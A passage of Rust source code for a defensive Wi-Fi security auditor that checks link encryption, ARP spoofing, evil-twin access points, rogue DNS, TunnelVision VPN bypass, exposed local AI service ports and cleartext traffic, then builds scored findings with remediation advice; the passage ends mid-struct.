use crate::models::{
    score_and_grade, AuditStatus, ConnectionEntry, ExposureScope, IpCategory, SecurityFinding,
    Severity, WifiProfileCategory, WifiRiskCheck, WifiShieldReport,
};
use crate::report::write_report_atomic;
use std::collections::{BTreeSet, HashMap};
use std::io::Read;
use std::net::{IpAddr, Ipv4Addr};
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

const MAX_CMD_OUTPUT_BYTES: u64 = 256 * 1024;
const CMD_TIMEOUT: Duration = Duration::from_millis(1500);
const MAX_TRACKED_SSIDS: usize = 128;
const PROFILE_CACHE_TTL: Duration = Duration::from_secs(30);

/// 2026-2027 local AI / LLM / MCP / dev agent ports frequently left bound to 0.0.0.0 without auth.
pub const SHADOW_AI_AND_AGENT_PORTS: &[(u16, &str)] = &[
    (1234, "LM Studio OpenAI API"),
    (3000, "Open WebUI / MCP SSE Dev"),
    (3001, "Local Agent / MCP Gateway"),
    (5555, "Android ADB over TCP"),
    (6333, "Qdrant Vector DB"),
    (7860, "Gradio Local AI UI"),
    (8000, "vLLM / ChromaDB / FastAPI"),
    (8080, "Local AI Proxy / llama.cpp"),
    (8188, "ComfyUI Workflow API"),
    (8265, "Ray Cluster Dashboard"),
    (8888, "Jupyter Notebook / Lab"),
    (11434, "Ollama LLM Daemon"),
];

/// Plaintext application protocols unsafe over untrusted Wi-Fi links.
const CLEARTEXT_PORTS: &[(u16, &str)] = &[
    (21, "FTP"),
    (23, "Telnet"),
    (25, "SMTP"),
    (80, "HTTP"),
    (110, "POP3"),
    (143, "IMAP"),
    (1883, "MQTT"),
    (6379, "Redis"),
];

/// Well-known public recursive resolvers with DoH/DoT/DNSSEC support.
fn is_trusted_public_dns(ip: IpAddr) -> bool {
    let s = ip.to_string();
    matches!(
        s.as_str(),
        "1.1.1.1"
            | "1.0.0.1"
            | "1.1.1.2"
            | "1.0.0.2"
            | "8.8.8.8"
            | "8.8.4.4"
            | "9.9.9.9"
            | "149.112.112.112"
            | "208.67.222.222"
            | "208.67.220.220"
            | "94.140.14.14"
            | "94.140.15.15"
            | "2606:4700:4700::1111"
            | "2606:4700:4700::1001"
            | "2001:4860:4860::8888"
            | "2001:4860:4860::8844"
            | "2620:fe::fe"
            | "2620:fe::9"
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum WifiAuthStrength {
    OpenOrBroken = 0,
    EnhancedOpenOwe = 1,
    SharedPskWpa2 = 2,
    StrongSaeOrEnterprise = 3,
}

#[derive(Debug, Clone)]
struct SessionApBaseline {
    bssid: String,
    auth_strength: WifiAuthStrength,
    gateway_ip: Option<IpAddr>,
    gateway_mac: Option<String>,
    dns_servers: Vec<IpAddr>,
}

#[derive(Debug, Clone, Default)]
pub struct ParsedWifiInterface {
    pub connected: bool,
    pub interface_name: String,
    pub guid: Option<String>,
    pub ssid: String,
    pub bssid: String,
    pub auth_suite: String,
    pub cipher_suite: String,
    pub auth_strength: Option<WifiAuthStrength>,
    pub radio_info: String,
    pub signal_percent: Option<u8>,
    pub rssi_dbm: Option<i32>,
}

#[derive(Debug, Clone, Default)]
pub struct ParsedRouteTelemetry {
    pub interface_index: Option<u32>,
    pub default_gateway: Option<Ipv4Addr>,
    pub vpn_active: bool,
    pub vpn_interfaces: Vec<String>,
    pub tunnelvision_bypass: bool,
}

#[derive(Debug, Clone, Default)]
pub struct RawLinkSnapshot {
    pub wifi: ParsedWifiInterface,
    pub profile_category: WifiProfileCategory,
    pub local_ip: Option<IpAddr>,
    pub subnet_prefix: Option<u8>,
    pub dhcp_server: Option<IpAddr>,
    pub dns_servers: Vec<IpAddr>,
    pub route: ParsedRouteTelemetry,
    pub arp_neighbors: Vec<(Ipv4Addr, String)>,
}

impl Default for WifiProfileCategory {
    fn default() -> Self {
        WifiProfileCategory::Unknown
    }
}

/// Stateful cross-scan tracker for Evil-Twin BSSID/auth downgrade and Gateway MAC continuity.
pub struct WifiRadarState {
    baselines: HashMap<String, SessionApBaseline>,
    profile_cache: Option<(String, Instant, WifiProfileCategory)>,
}

impl Default for WifiRadarState {
    fn default() -> Self {
        Self::new()
    }
}

impl WifiRadarState {
    #[must_use]
    pub fn new() -> Self {
        Self {
            baselines: HashMap::new(),
            profile_cache: None,
        }
    }

    pub fn evaluate(
        &mut self,
        connections: &[ConnectionEntry],
        findings: &mut Vec<SecurityFinding>,
        is_elevated: bool,
    ) -> Option<WifiShieldReport> {
        let raw = self.collect_platform_telemetry(is_elevated)?;
        Some(self.analyze_link_snapshot(raw, connections, findings))
    }

    /// Pure deterministic analyzer (separated from OS I/O for unit testing).
    pub fn analyze_link_snapshot(
        &mut self,
        raw: RawLinkSnapshot,
        connections: &[ConnectionEntry],
        findings: &mut Vec<SecurityFinding>,
    ) -> WifiShieldReport {
        if !raw.wifi.connected {
            return WifiShieldReport {
                connected: false,
                interface_name: raw.wifi.interface_name,
                interface_guid: raw.wifi.guid,
                interface_index: raw.route.interface_index,
                ssid: String::new(),
                bssid: String::new(),
                auth_suite: "Disconnected".to_string(),
                cipher_suite: "-".to_string(),
                radio_info: "-".to_string(),
                signal_percent: None,
                rssi_dbm: None,
                profile_category: WifiProfileCategory::Unknown,
                local_ip: None,
                subnet_prefix: None,
                gateway_ip: None,
                gateway_mac: None,
                dhcp_server: None,
                dns_servers: Vec::new(),
                vpn_active: raw.route.vpn_active,
                vpn_interfaces: raw.route.vpn_interfaces,
                tunnelvision_bypass: false,
                is_public_or_guest_ssid: false,
                wifi_safety_score: 100,
                wifi_grade: "A+".to_string(),
                risk_level: Severity::Safe,
                exposed_lan_listeners: 0,
                exposed_shadow_ai_ports: Vec::new(),
                cleartext_sockets: 0,
                checks: vec![WifiRiskCheck {
                    check_id: "WIFI-00".to_string(),
                    vector: "Wi-Fi Radio State".to_string(),
                    status: AuditStatus::Info,
                    severity: Severity::Safe,
                    detail: "No active 802.11 wireless association detected (wired or offline)."
                        .to_string(),
                    recommendation:
                        "Wi-Fi Shield automatically activates as soon as a wireless SSID connects."
                            .to_string(),
                }],
            };
        }

        let auth_strength = raw
            .wifi
            .auth_strength
            .unwrap_or_else(|| classify_auth_Cipher(&raw.wifi.auth_suite, &raw.wifi.cipher_suite));

        let is_public_ssid_name = looks_like_public_or_guest_ssid(&raw.wifi.ssid);
        let is_untrusted_wifi = is_public_ssid_name
            || raw.profile_category == WifiProfileCategory::Public
            || auth_strength <= WifiAuthStrength::EnhancedOpenOwe;

        let gateway_ip = raw.route.default_gateway.map(IpAddr::V4);
        let gateway_mac = raw.route.default_gateway.and_then(|gw| {
            raw.arp_neighbors
                .iter()
                .find(|(ip, _)| *ip == gw)
                .map(|(_, mac)| mac.clone())
        });

        let mut checks = Vec::with_capacity(8);
        let mut wifi_findings_for_score: Vec<SecurityFinding> = Vec::new();

        // 1. WIFI-01: Link Encryption & IEEE 802.11 AKM Posture
        match auth_strength {
            WifiAuthStrength::OpenOrBroken => {
                let f = SecurityFinding {
                    severity: Severity::Critical,
                    rule_id: "H10-WIFI-OPEN".to_string(),
                    category: "Hostile Wi-Fi Link".to_string(),
                    mitre_id: "T1557".to_string(),
                    title: format!(
                        "Unencrypted or Broken Wi-Fi Link ('{}')",
                        raw.wifi.ssid
                    ),
                    description: format!(
                        "Active Wi-Fi SSID '{}' uses '{}' / '{}'. Any nearby radio within range can passively sniff layer-2 frames and inject TCP/DNS responses.",
                        raw.wifi.ssid, raw.wifi.auth_suite, raw.wifi.cipher_suite
                    ),
                    process_name: None,
                    pid: None,
                    endpoint: Some(raw.wifi.interface_name.clone()),
                    evidence: format!(
                        "SSID: {} | BSSID: {} | Auth: {} | Cipher: {}",
                        raw.wifi.ssid, raw.wifi.bssid, raw.wifi.auth_suite, raw.wifi.cipher_suite
                    ),
                    remediation: "Disconnect immediately or route 100% of traffic through a full-tunnel WireGuard/OpenVPN kill-switch and export the Wi-Fi Shield lockdown script ([l]).".to_string(),
                };
                wifi_findings_for_score.push(f.clone());
                findings.push(f);
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-01".to_string(),
                    vector: "802.11 Link Encryption".to_string(),
                    status: AuditStatus::Critical,
                    severity: Severity::Critical,
                    detail: format!(
                        "OPEN / Weak cipher ({} / {}) on SSID '{}'",
                        raw.wifi.auth_suite, raw.wifi.cipher_suite, raw.wifi.ssid
                    ),
                    recommendation:
                        "Use WPA3-SAE / 802.1X or enforce a full-tunnel VPN before transmitting data."
                            .to_string(),
                });
            }
            WifiAuthStrength::EnhancedOpenOwe => {
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-01".to_string(),
                    vector: "802.11 Link Encryption".to_string(),
                    status: AuditStatus::Warning,
                    severity: Severity::Medium,
                    detail: format!(
                        "Enhanced Open (OWE / {}) — Opportunistic encryption without AP identity authentication",
                        raw.wifi.cipher_suite
                    ),
                    recommendation:
                        "OWE prevents passive sniffing but cannot authenticate the AP against active Evil-Twin impersonation; keep VPN enabled."
                            .to_string(),
                });
            }
            WifiAuthStrength::SharedPskWpa2 if is_public_ssid_name => {
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-01".to_string(),
                    vector: "802.11 Link Encryption".to_string(),
                    status: AuditStatus::Warning,
                    severity: Severity::Low,
                    detail: format!(
                        "{} ({}) on shared guest SSID '{}' — co-connected guests knowing the PSK can decrypt captured 4-way handshakes",
                        raw.wifi.auth_suite, raw.wifi.cipher_suite, raw.wifi.ssid
                    ),
                    recommendation:
                        "Treat shared cafe/hotel WPA2-PSK passwords as untrusted L2; prefer WPA3-SAE or full-tunnel VPN."
                            .to_string(),
                });
            }
            _ => {
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-01".to_string(),
                    vector: "802.11 Link Encryption".to_string(),
                    status: AuditStatus::Pass,
                    severity: Severity::Safe,
                    detail: format!(
                        "Strong link protection: {} / {} (per-session forward secrecy)",
                        raw.wifi.auth_suite, raw.wifi.cipher_suite
                    ),
                    recommendation: "Link-layer cipher is modern; continue verifying L3 gateway/DNS trust on guest LANs.".to_string(),
                });
            }
        }

        // 2. WIFI-02: ARP Spoofing / Gateway MAC Collision & Session Continuity
        let gw_collision_ips: Vec<Ipv4Addr> = if let (Some(gw_ip), Some(gw_mac)) =
            (raw.route.default_gateway, gateway_mac.as_deref())
        {
            raw.arp_neighbors
                .iter()
                .filter(|(ip, mac)| *ip != gw_ip && mac == gw_mac && is_valid_unicast_mac(mac))
                .map(|(ip, _)| *ip)
                .collect()
        } else {
            Vec::new()
        };

        let prev_baseline = self.baselines.get(&raw.wifi.ssid).cloned();
        let gw_mac_flipped = match (&prev_baseline, gateway_ip, gateway_mac.as_deref()) {
            (Some(prev), Some(curr_gw_ip), Some(curr_gw_mac))
                if prev.gateway_ip == Some(curr_gw_ip) =>
            {
                prev.gateway_mac
                    .as_deref()
                    .is_some_and(|old_mac| old_mac != curr_gw_mac)
            }
            _ => false,
        };

        if !gw_collision_ips.is_empty() || gw_mac_flipped {
            let evidence = if !gw_collision_ips.is_empty() {
                let peers: Vec<String> = gw_collision_ips.iter().map(ToString::to_string).collect();
                format!(
                    "Gateway {:?} MAC ({}) also claimed by peer IP(s): {}",
                    gateway_ip,
                    gateway_mac.as_deref().unwrap_or("?"),
                    peers.join(", ")
                )
            } else {
                format!(
                    "Gateway {:?} MAC changed mid-session: {} -> {}",
                    gateway_ip,
                    prev_baseline
                        .as_ref()
                        .and_then(|b| b.gateway_mac.as_deref())
                        .unwrap_or("?"),
                    gateway_mac.as_deref().unwrap_or("?")
                )
            };
            let f = SecurityFinding {
                severity: Severity::Critical,
                rule_id: "H10-ARP-MITM".to_string(),
                category: "Layer-2 Man-in-the-Middle".to_string(),
                mitre_id: "T1557.002".to_string(),
                title: "ARP Cache Poisoning / Gateway MAC Spoofing Detected".to_string(),
                description: format!(
                    "Active Wi-Fi interface '{}' shows Layer-2 gateway MAC duplication or mid-session mutation consistent with ARP spoofing (Ettercap/bettercap).",
                    raw.wifi.interface_name
                ),
                process_name: None,
                pid: None,
                endpoint: gateway_ip.map(|ip| ip.to_string()),
                evidence: evidence.clone(),
                remediation: "Disconnect from this Wi-Fi network immediately; an active L2 attacker on the subnet is intercepting gateway traffic.".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-02".to_string(),
                vector: "ARP & Gateway Integrity".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::Critical,
                detail: evidence,
                recommendation: "Disconnect immediately and flush ARP cache after leaving the untrusted network.".to_string(),
            });
        } else {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-02".to_string(),
                vector: "ARP & Gateway Integrity".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: format!(
                    "Gateway {} -> MAC {} (unique across {} local ARP neighbor(s))",
                    gateway_ip
                        .map(|ip| ip.to_string())
                        .unwrap_or_else(|| "none".to_string()),
                    gateway_mac.as_deref().unwrap_or("unresolved"),
                    raw.arp_neighbors.len()
                ),
                recommendation: "Keep monitoring in TUI or --watch mode for mid-session ARP poisoning.".to_string(),
            });
        }

        // 3. WIFI-03: Evil-Twin BSSID & Auth Downgrade Continuity
        if let Some(prev) = &prev_baseline {
            let auth_downgraded = auth_strength < prev.auth_strength;
            let bssid_changed = !prev.bssid.is_empty()
                && !raw.wifi.bssid.is_empty()
                && prev.bssid != raw.wifi.bssid;
            let dns_shifted = !prev.dns_servers.is_empty()
                && !raw.dns_servers.is_empty()
                && prev.dns_servers != raw.dns_servers;

            if auth_downgraded || (bssid_changed && gw_mac_flipped && dns_shifted) {
                let detail = format!(
                    "SSID '{}' downgraded/mutated: BSSID {} -> {}, Auth {:?} -> {:?}",
                    raw.wifi.ssid, prev.bssid, raw.wifi.bssid, prev.auth_strength, auth_strength
                );
                let f = SecurityFinding {
                    severity: Severity::Critical,
                    rule_id: "H10-WIFI-EVIL-TWIN".to_string(),
                    category: "Rogue Access Point".to_string(),
                    mitre_id: "T1557".to_string(),
                    title: format!("Evil-Twin / Rogue AP Transition on '{}'", raw.wifi.ssid),
                    description: "Wireless client transitioned to an access point with weaker security or simultaneous BSSID + Gateway MAC + DNS mutation.".to_string(),
                    process_name: None,
                    pid: None,
                    endpoint: Some(raw.wifi.bssid.clone()),
                    evidence: detail.clone(),
                    remediation: "Forget the auto-connect profile or disable automatic connection to open/downgraded networks.".to_string(),
                };
                wifi_findings_for_score.push(f.clone());
                findings.push(f);
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-03".to_string(),
                    vector: "Evil-Twin Continuity".to_string(),
                    status: AuditStatus::Critical,
                    severity: Severity::Critical,
                    detail,
                    recommendation: "Disconnect and verify BSSID/WPA3 requirement in wireless profile settings.".to_string(),
                });
            } else if bssid_changed && oui_prefix(&prev.bssid) != oui_prefix(&raw.wifi.bssid) {
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-03".to_string(),
                    vector: "Evil-Twin Continuity".to_string(),
                    status: AuditStatus::Warning,
                    severity: Severity::Medium,
                    detail: format!(
                        "AP roamed across different hardware vendor OUIs: {} -> {} (cipher intact)",
                        prev.bssid, raw.wifi.bssid
                    ),
                    recommendation: "Verify whether venue uses mixed-vendor APs; avoid entering captive-portal credentials.".to_string(),
                });
            } else {
                checks.push(WifiRiskCheck {
                    check_id: "WIFI-03".to_string(),
                    vector: "Evil-Twin Continuity".to_string(),
                    status: AuditStatus::Pass,
                    severity: Severity::Safe,
                    detail: format!("AP BSSID {} consistent with session security baseline", raw.wifi.bssid),
                    recommendation: "No authentication downgrade or rogue OUI anomaly observed.".to_string(),
                });
            }
        } else {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-03".to_string(),
                vector: "Evil-Twin Continuity".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: format!(
                    "Baseline pinned for SSID '{}' -> BSSID {}",
                    raw.wifi.ssid,
                    if raw.wifi.bssid.is_empty() { "unknown" } else { &raw.wifi.bssid }
                ),
                recommendation: "Keep TUI auto-refresh or --watch running to catch Evil-Twin deauth/reassociation.".to_string(),
            });
        }

        // Update session AP baseline (only upgrade or record initial baseline so downgrades remain detectable).
        if self.baselines.len() >= MAX_TRACKED_SSIDS && !self.baselines.contains_key(&raw.wifi.ssid) {
            self.baselines.clear();
        }
        let max_auth = prev_baseline
            .as_ref()
            .map_or(auth_strength, |p| p.auth_strength.max(auth_strength));
        self.baselines.insert(
            raw.wifi.ssid.clone(),
            SessionApBaseline {
                bssid: raw.wifi.bssid.clone(),
                auth_strength: max_auth,
                gateway_ip,
                gateway_mac: gateway_mac.clone(),
                dns_servers: raw.dns_servers.clone(),
            },
        );

        // 4. WIFI-04: OS Firewall Trust Profile vs. Public/Guest SSID
        if raw.profile_category == WifiProfileCategory::Private
            && (is_public_ssid_name || auth_strength == WifiAuthStrength::OpenOrBroken)
        {
            let detail = format!(
                "Untrusted/guest SSID '{}' is classified as PRIVATE — lowers host firewall rules for SMB/mDNS/discovery",
                raw.wifi.ssid
            );
            let f = SecurityFinding {
                severity: Severity::High,
                rule_id: "H10-WIFI-PRIVATE-PROFILE".to_string(),
                category: "Host Firewall Posture".to_string(),
                mitre_id: "T1562.004".to_string(),
                title: format!(
                    "Public/Guest Wi-Fi '{}' Marked as Trusted Private Network",
                    raw.wifi.ssid
                ),
                description: "Marking a hotel, cafe, or open Wi-Fi network as 'Private' instructs the OS firewall to trust every stranger on the subnet as a home LAN peer.".to_string(),
                process_name: None,
                pid: None,
                endpoint: Some(raw.wifi.interface_name.clone()),
                evidence: detail.clone(),
                remediation: "Switch the Wi-Fi network category to Public immediately (press [l] in TUI to export the lockdown script).".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-04".to_string(),
                vector: "OS Network Trust Profile".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::High,
                detail,
                recommendation: "Set network profile category to Public (Zero-Trust) to isolate inbound LAN ports.".to_string(),
            });
        } else {
            let (st, sev) = if raw.profile_category == WifiProfileCategory::Public {
                (AuditStatus::Pass, Severity::Safe)
            } else {
                (AuditStatus::Info, Severity::Safe)
            };
            checks.push(WifiRiskCheck {
                check_id: "WIFI-04".to_string(),
                vector: "OS Network Trust Profile".to_string(),
                status: st,
                severity: sev,
                detail: format!(
                    "Active profile: {} | Subnet prefix: /{}",
                    raw.profile_category.label(),
                    raw.subnet_prefix.unwrap_or(24)
                ),
                recommendation: if raw.subnet_prefix.is_some_and(|p| p <= 20) && is_untrusted_wifi {
                    "Large guest broadcast domain (/20 or wider); keep Public firewall rules strictly enforced.".to_string()
                } else {
                    "Firewall profile matches network trust posture.".to_string()
                },
            });
        }

        // 5. WIFI-05: DNS Hijack & Unencrypted Local Resolver Check
        let has_rogue_public_dns = raw.dns_servers.iter().any(|ip| {
            !ip.is_loopback() && is_public_unicast(*ip) && !is_trusted_public_dns(*ip)
        });
        let uses_untrusted_lan_dns = is_untrusted_wifi
            && !raw.dns_servers.is_empty()
            && raw
                .dns_servers
                .iter()
                .all(|ip| !ip.is_loopback() && !is_trusted_public_dns(*ip));
        let dns_list_str = if raw.dns_servers.is_empty() {
            "none detected".to_string()
        } else {
            raw.dns_servers
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>()
                .join(", ")
        };

        if has_rogue_public_dns {
            let detail = format!(
                "Unrecognized external DNS resolver(s) pushed on Wi-Fi: {}",
                dns_list_str
            );
            let f = SecurityFinding {
                severity: Severity::High,
                rule_id: "H10-WIFI-ROGUE-DNS".to_string(),
                category: "DNS Hijacking".to_string(),
                mitre_id: "T1584.002".to_string(),
                title: "Non-Standard External DNS Resolver Configured on Wi-Fi".to_string(),
                description: "The wireless interface uses an unrecognized public IP for DNS resolution, allowing domain spoofing and captive phishing.".to_string(),
                process_name: None,
                pid: None,
                endpoint: Some(dns_list_str.clone()),
                evidence: detail.clone(),
                remediation: "Override Wi-Fi DNS with encrypted DNS-over-HTTPS (1.1.1.1 / 9.9.9.9) or route DNS inside a VPN tunnel.".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-05".to_string(),
                vector: "DNS Resolver Trust".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::High,
                detail,
                recommendation: "Enable OS DNS-over-HTTPS (DoH) with 1.1.1.1 or 9.9.9.9.".to_string(),
            });
        } else if uses_untrusted_lan_dns && !raw.route.vpn_active {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-05".to_string(),
                vector: "DNS Resolver Trust".to_string(),
                status: AuditStatus::Warning,
                severity: Severity::Low,
                detail: format!(
                    "Using venue/gateway DHCP DNS ({}) without VPN — venue operator can log or intercept DNS queries",
                    dns_list_str
                ),
                recommendation: "Enable DNS-over-HTTPS (1.1.1.1 / 9.9.9.9) or activate a full-tunnel VPN on guest Wi-Fi.".to_string(),
            });
        } else {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-05".to_string(),
                vector: "DNS Resolver Trust".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: format!("DNS resolver(s): {}", dns_list_str),
                recommendation: "Resolver posture verified.".to_string(),
            });
        }

        // 6. WIFI-06: VPN Kill-Switch & TunnelVision (CVE-2024-3661) Split-Route Injection
        if raw.route.tunnelvision_bypass {
            let detail = format!(
                "Active VPN ({}) bypassed by 0.0.0.0/1 + 128.0.0.0/1 narrow routes pointing to Wi-Fi gateway {:?}",
                raw.route.vpn_interfaces.join(", "),
                gateway_ip
            );
            let f = SecurityFinding {
                severity: Severity::High,
                rule_id: "H10-VPN-BYPASS".to_string(),
                category: "VPN Decloaking (CVE-2024-3661)".to_string(),
                mitre_id: "T1557.002".to_string(),
                title: "TunnelVision (CVE-2024-3661) VPN Split-Route Bypass Detected".to_string(),
                description: "Narrow /1 routes route IPv4 traffic onto the untrusted Wi-Fi gateway despite an active VPN adapter, consistent with DHCP Option 121 TunnelVision decloaking.".to_string(),
                process_name: None,
                pid: None,
                endpoint: gateway_ip.map(|ip| ip.to_string()),
                evidence: detail.clone(),
                remediation: "Enable strict firewall-based VPN kill-switch rules that block non-tunnel interface egress (or ignore DHCP Option 121).".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-06".to_string(),
                vector: "VPN & TunnelVision Guard".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::High,
                detail,
                recommendation: "Enforce interface-scoped firewall kill-switch rules.".to_string(),
            });
        } else if is_untrusted_wifi && !raw.route.vpn_active {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-06".to_string(),
                vector: "VPN & TunnelVision Guard".to_string(),
                status: AuditStatus::Warning,
                severity: Severity::Low,
                detail: "No active VPN tunnel detected while connected to guest/public Wi-Fi".to_string(),
                recommendation: "Connect a WireGuard/Tailscale exit node or OpenVPN full tunnel to shield metadata from the venue gateway.".to_string(),
            });
        } else {
            let label = if raw.route.vpn_active {
                format!("Encrypted tunnel active ({})", raw.route.vpn_interfaces.join(", "))
            } else {
                "Private Wi-Fi link (no TunnelVision route anomaly)".to_string()
            };
            checks.push(WifiRiskCheck {
                check_id: "WIFI-06".to_string(),
                vector: "VPN & TunnelVision Guard".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: label,
                recommendation: "Routing table shows no rogue /1 VPN-bypass routes.".to_string(),
            });
        }

        // 7. WIFI-07: LAN Peer Attack Surface & 2026-2027 Shadow AI / Agent Exposure
        let mut exposed_ports_set: BTreeSet<u16> = BTreeSet::new();
        let mut shadow_ai_set: BTreeSet<(u16, &'static str)> = BTreeSet::new();
        for c in connections {
            if c.is_listening()
                && (c.exposure.is_network_reachable()
                    || c.exposure == ExposureScope::LoopbackProxy)
                && (c.protocol.is_tcp() || is_lockdown_eligible_udp_port(c.local_port))
            {
                exposed_ports_set.insert(c.local_port);
                if let Some(&(_, label)) = SHADOW_AI_AND_AGENT_PORTS
                    .iter()
                    .find(|(p, _)| *p == c.local_port)
                {
                    shadow_ai_set.insert((c.local_port, label));
                }
            }
        }
        let exposed_lan_listeners = exposed_ports_set.len();
        let exposed_shadow_ai_ports: Vec<u16> = shadow_ai_set.iter().map(|(p, _)| *p).collect();

        if !shadow_ai_set.is_empty() && is_untrusted_wifi {
            let desc_list: Vec<String> = shadow_ai_set
                .iter()
                .map(|(p, name)| format!("{}:{}", name, p))
                .collect();
            let detail = format!(
                "Unauthenticated local AI/agent service(s) reachable on guest Wi-Fi: {}",
                desc_list.join(", ")
            );
            let f = SecurityFinding {
                severity: Severity::High,
                rule_id: "H10-WIFI-SHADOW-AI".to_string(),
                category: "Shadow AI & Agent Exposure".to_string(),
                mitre_id: "T1190".to_string(),
                title: "Local AI / MCP / Dev Agent Port Exposed on Untrusted Wi-Fi".to_string(),
                description: format!(
                    "Wildcard-bound AI/agent ports ({}) are reachable by peers on '{}', risking prompt theft, RAG exfiltration, or tool RCE.",
                    desc_list.join(", "),
                    raw.wifi.ssid
                ),
                process_name: None,
                pid: None,
                endpoint: Some(desc_list.join(", ")),
                evidence: detail.clone(),
                remediation: "Bind local LLM/MCP servers strictly to 127.0.0.1 (e.g. OLLAMA_HOST=127.0.0.1) or export the Wi-Fi Shield lockdown script ([l]).".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-07".to_string(),
                vector: "LAN & Shadow AI Surface".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::High,
                detail,
                recommendation: "Bind AI/MCP services to 127.0.0.1 and apply Public firewall inbound blocks ([l]).".to_string(),
            });
        } else if exposed_lan_listeners > 0 && is_untrusted_wifi {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-07".to_string(),
                vector: "LAN & Shadow AI Surface".to_string(),
                status: AuditStatus::Warning,
                severity: Severity::Medium,
                detail: format!(
                    "{} non-loopback listener port(s) bound on host while on guest Wi-Fi (0 Shadow AI ports)",
                    exposed_lan_listeners
                ),
                recommendation: "Press [l] in TUI (or --export-lockdown) to generate explicit Public-profile inbound block rules for all exposed ports.".to_string(),
            });
        } else {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-07".to_string(),
                vector: "LAN & Shadow AI Surface".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: format!(
                    "{} non-loopback listener(s) | 0 Shadow AI / MCP ports exposed",
                    exposed_lan_listeners
                ),
                recommendation: "Keep local dev and AI servers bound to 127.0.0.1.".to_string(),
            });
        }

        // 8. WIFI-08: Live Cleartext Protocol Egress Monitor
        let mut cleartext_flows: Vec<String> = Vec::new();
        for c in connections {
            if !c.is_listening()
                && matches!(
                    c.remote_category,
                    IpCategory::PublicInternet | IpCategory::PrivateLan
                )
            {
                if let Some(rport) = c.remote_port {
                    if let Some(&(_, proto_name)) =
                        CLEARTEXT_PORTS.iter().find(|(p, _)| *p == rport)
                    {
                        cleartext_flows.push(format!(
                            "{} -> {}:{} ({})",
                            c.process_name,
                            c.remote_ip
                                .map(|ip| ip.to_string())
                                .unwrap_or_else(|| "?".to_string()),
                            rport,
                            proto_name
                        ));
                    }
                }
            }
        }
        let cleartext_sockets = cleartext_flows.len();
        if cleartext_sockets > 0 && is_untrusted_wifi {
            let sample: Vec<String> = cleartext_flows.into_iter().take(3).collect();
            let detail = format!(
                "{} active unencrypted flow(s) over untrusted Wi-Fi: {}",
                cleartext_sockets,
                sample.join("; ")
            );
            let f = SecurityFinding {
                severity: Severity::High,
                rule_id: "H10-WIFI-CLEARTEXT".to_string(),
                category: "Cleartext Traffic Leak".to_string(),
                mitre_id: "T1040".to_string(),
                title: "Unencrypted Application Traffic Active Over Untrusted Wi-Fi".to_string(),
                description: "Active sockets are transmitting unencrypted application protocols (HTTP/FTP/Telnet/SMTP/IMAP/MQTT/Redis) across a public or guest wireless network.".to_string(),
                process_name: None,
                pid: None,
                endpoint: sample.first().cloned(),
                evidence: detail.clone(),
                remediation: "Switch endpoints to TLS/HTTPS or tunnel traffic over WireGuard/SSH before continuing.".to_string(),
            };
            wifi_findings_for_score.push(f.clone());
            findings.push(f);
            checks.push(WifiRiskCheck {
                check_id: "WIFI-08".to_string(),
                vector: "Cleartext Egress Monitor".to_string(),
                status: AuditStatus::Critical,
                severity: Severity::High,
                detail,
                recommendation: "Terminate plaintext HTTP/FTP/Telnet/Redis sessions on public Wi-Fi.".to_string(),
            });
        } else {
            checks.push(WifiRiskCheck {
                check_id: "WIFI-08".to_string(),
                vector: "Cleartext Egress Monitor".to_string(),
                status: AuditStatus::Pass,
                severity: Severity::Safe,
                detail: "0 active cleartext (HTTP/FTP/Telnet/legacy mail) sockets on external links".to_string(),
                recommendation: "All observed active remote connections use encrypted or non-plaintext ports.".to_string(),
            });
        }

        // Compute dedicated Wi-Fi Safety Score (penalizing both Critical/High findings and Medium/Low advisories).
        let (mut wifi_score, _) = score_and_grade(&wifi_findings_for_score, false);
        let advisory_penalty: u8 = checks
            .iter()
            .filter(|c| c.status == AuditStatus::Warning)
            .map(|c| match c.severity {
                Severity::Medium => 8,
                Severity::Low => 4,
                _ => 2,
            })
            .sum();
        wifi_score = wifi_score.saturating_sub(advisory_penalty);
        let wifi_grade = match wifi_score {
            95..=100 => "A+",
            85..=94 => "A",
            75..=84 => "B",
            60..=74 => "C",
            40..=59 => "D",
            _ => "F",
        }
        .to_string();
        let risk_level = checks
            .iter()
            .map(|c| c.severity)
            .max()
            .unwrap_or(Severity::Safe);

        WifiShieldReport {
            connected: true,
            interface_name: raw.wifi.interface_name,
            interface_guid: raw.wifi.guid,
            interface_index: raw.route.interface_index,
            ssid: raw.wifi.ssid,
            bssid: raw.wifi.bssid,
